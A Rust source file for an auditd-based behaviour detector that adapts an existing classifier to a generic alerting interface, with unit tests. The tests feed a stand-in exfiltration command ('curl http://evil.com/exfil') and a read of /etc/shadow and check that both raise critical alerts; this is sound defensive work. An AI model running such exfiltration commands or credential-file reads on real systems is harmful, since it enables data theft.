use crate::auditd::{Actor, ParsedEvent};
use crate::behavior::{self, BehaviorCategory};
use crate::detect::traits::{AlertProposal, DetectionEvent, Detector};

/// Adapter that exposes the existing hardcoded behavior classifier
/// behind the generic `Detector` interface.
///
/// Phase 2 migration note:
/// - Matching logic remains 100% in `behavior::classify_behavior`
/// - This adapter only performs event-shape translation + proposal formatting
/// - Runtime alert routing/invariants remain unchanged until later wiring PRs
pub struct BehaviorDetector;

impl BehaviorDetector {
    pub fn new() -> Self {
        Self
    }

    fn parse_args(fields: &std::collections::HashMap<String, String>) -> Vec<String> {
        if let Some(json_args) = fields.get("args") {
            if let Ok(parsed) = serde_json::from_str::<Vec<String>>(json_args) {
                return parsed;
            }
            if !json_args.trim().is_empty() {
                return json_args
                    .split_whitespace()
                    .map(|s| s.to_string())
                    .collect();
            }
        }
        Vec::new()
    }

    fn parse_success(fields: &std::collections::HashMap<String, String>) -> bool {
        fields
            .get("success")
            .map(|s| matches!(s.as_str(), "true" | "1" | "yes" | "ok"))
            .unwrap_or(true)
    }

    fn parse_actor(fields: &std::collections::HashMap<String, String>) -> Actor {
        match fields.get("actor").map(|s| s.as_str()) {
            Some("agent") => Actor::Agent,
            Some("human") => Actor::Human,
            _ => Actor::Unknown,
        }
    }

    fn to_parsed_event(event: &DetectionEvent) -> ParsedEvent {
        let fields = &event.fields;
        let command = fields.get("command").cloned();
        let args = Self::parse_args(fields);
        let file_path = fields.get("file_path").cloned();
        let raw = event
            .raw
            .clone()
            .or_else(|| fields.get("raw").cloned())
            .unwrap_or_default();

        ParsedEvent {
            syscall_name: fields
                .get("syscall_name")
                .cloned()
                .unwrap_or_else(|| event.event_type.clone()),
            command,
            args,
            file_path,
            success: Self::parse_success(fields),
            raw,
            actor: Self::parse_actor(fields),
            ppid_exe: fields.get("ppid_exe").cloned(),
        }
    }

    fn severity_to_label(severity: &crate::alerts::Severity) -> &'static str {
        match severity {
            crate::alerts::Severity::Critical => "critical",
            crate::alerts::Severity::Warning => "warning",
            crate::alerts::Severity::Info => "info",
        }
    }

    fn category_tag(category: &BehaviorCategory) -> String {
        format!("category:{}", category.to_string().to_lowercase())
    }

    fn evidence_message(parsed: &ParsedEvent) -> String {
        if let Some(cmd) = &parsed.command {
            return cmd.clone();
        }
        if let Some(path) = &parsed.file_path {
            return format!("{} {}", parsed.syscall_name, path);
        }
        if !parsed.raw.is_empty() {
            return parsed.raw.chars().take(120).collect();
        }
        parsed.syscall_name.clone()
    }
}

impl Default for BehaviorDetector {
    fn default() -> Self {
        Self::new()
    }
}

impl Detector for BehaviorDetector {
    fn id(&self) -> &'static str {
        "behavior-detector"
    }

    fn version(&self) -> &'static str {
        env!("CARGO_PKG_VERSION")
    }

    fn evaluate(&self, event: &DetectionEvent) -> Vec<AlertProposal> {
        let parsed = Self::to_parsed_event(event);
        let Some((category, severity)) = behavior::classify_behavior(&parsed) else {
            return vec![];
        };

        vec![AlertProposal {
            rule_id: format!("behavior.{}", category.to_string().to_lowercase()),
            source: "behavior".to_string(),
            severity: Self::severity_to_label(&severity).to_string(),
            title: format!("Behavior match: {}", category),
            message: Self::evidence_message(&parsed),
            tags: vec![
                "engine:behavior".to_string(),
                Self::category_tag(&category),
                format!("event:{}", parsed.syscall_name),
            ],
        }]
    }
}

#[cfg(test)]
mod tests {
    use std::collections::HashMap;

    use super::*;

    fn make_event(event_type: &str, fields: &[(&str, &str)]) -> DetectionEvent {
        let mut map = HashMap::new();
        for (k, v) in fields {
            map.insert((*k).to_string(), (*v).to_string());
        }

        DetectionEvent {
            source: "auditd".to_string(),
            event_type: event_type.to_string(),
            fields: map,
            raw: None,
        }
    }

    #[test]
    fn adapter_detects_known_exfil_behavior() {
        let detector = BehaviorDetector::new();
        let ev = make_event(
            "execve",
            &[
                ("syscall_name", "execve"),
                ("command", "curl http://evil.com/exfil"),
                ("args", r#"["curl","http://evil.com/exfil"]"#),
                ("success", "true"),
            ],
        );

        let out = detector.evaluate(&ev);
        assert_eq!(out.len(), 1);
        let p = &out[0];
        assert_eq!(p.source, "behavior");
        assert_eq!(p.severity, "critical");
        assert!(p.rule_id.contains("data_exfil") || p.rule_id.contains("data_exfiltration") || p.rule_id.contains("data_exfil"));
    }

    #[test]
    fn adapter_returns_empty_for_benign_event() {
        let detector = BehaviorDetector::new();
        let ev = make_event(
            "execve",
            &[
                ("syscall_name", "execve"),
                ("command", "ls -la /tmp"),
                ("args", r#"["ls","-la","/tmp"]"#),
                ("success", "true"),
            ],
        );

        let out = detector.evaluate(&ev);
        assert!(out.is_empty());
    }

    #[test]
    fn adapter_detects_syscall_path_behavior() {
        let detector = BehaviorDetector::new();
        let ev = make_event(
            "openat",
            &[
                ("syscall_name", "openat"),
                ("file_path", "/etc/shadow"),
                ("success", "true"),
            ],
        );

        let out = detector.evaluate(&ev);
        assert_eq!(out.len(), 1);
        let p = &out[0];
        assert_eq!(p.severity, "critical");
        assert!(p.message.contains("/etc/shadow"));
    }
}